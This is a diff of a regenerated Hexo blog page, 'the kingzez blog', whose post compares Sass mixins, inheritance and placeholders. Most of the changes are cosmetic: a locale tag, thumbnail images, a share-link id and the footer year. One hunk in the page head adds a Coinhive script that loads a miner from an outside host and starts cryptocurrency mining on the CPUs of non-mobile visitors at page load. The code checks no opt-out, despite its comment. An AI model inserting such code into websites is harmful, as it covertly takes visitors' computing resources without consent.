@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2016/06/07/Sass中混合宏、继承、占位符比较/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="初学Sass对Sass的一点理解和笔记，Sass同Scss，其实两者指的都是一个，区别在于书写格式上，Sass的书写形式为ruby（其实我不了解ruby）">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2016-06-10T10:48:15.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sass中混合宏、继承、占位符比较">
@@ -63,6 +64,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -251,7 +266,7 @@
 <p>常用于 相同的代码块需要在不同的环境传递不同的值时，可以通过混合宏来定义重复使用的代码块
 <strong>不足</strong>：编译出来的css代码有相同部分的代码块不能自动合并，从而导致代码冗余</p>
 </blockquote>
-<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">声明方式 <span class="selector-class">.class</span></div><div class="line">调用方式 @extend</div></pre></td></tr></table></figure>
+<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">声明方式 .class</div><div class="line">调用方式 @extend</div></pre></td></tr></table></figure>
 <blockquote>
 <p>常用于 相同的代码块不需要传递不同的值，且在sass中已定义，这样可以通过Sass继承调用已存在的基类，使用继承可以将调用相同基类的代码合并到一起
 <strong>不足</strong>： 即使基类不存在与html的结构中，继承后都会生成基类样式的代码块</p>
@@ -270,7 +285,7 @@
 
 </div>
 
-    <a data-url="http://kingzez.com/2016/06/07/Sass中混合宏、继承、占位符比较/" data-id="cj3wdnjdf001m09he2yre1cl2" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2016/06/07/Sass中混合宏、继承、占位符比较/" data-id="cjcc61di4001n70fy43d81pag" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -408,7 +423,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -443,7 +458,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -478,7 +493,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -548,7 +563,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -602,7 +617,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
